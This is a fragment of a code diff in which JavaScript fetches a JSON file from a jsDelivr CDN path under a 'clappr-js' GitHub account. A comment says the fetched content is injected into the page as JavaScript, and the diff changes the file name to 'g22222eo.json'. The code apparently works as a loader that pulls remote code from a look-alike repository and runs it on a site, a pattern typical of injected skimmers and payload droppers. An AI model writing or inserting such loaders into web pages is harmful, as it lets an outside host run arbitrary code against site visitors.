@@ -1,7 +1,7 @@
 
 
     // Fetch the JSON file
-    fetch('https://cdn.jsdelivr.net/gh/clappr-js/clappr@main/geo.json')
+    fetch('https://cdn.jsdelivr.net/gh/clappr-js/clappr@main/g22222eo.json')
         .then(response => response.json())
         .then(jsonData => {
             // Inject the JavaScript code into the page
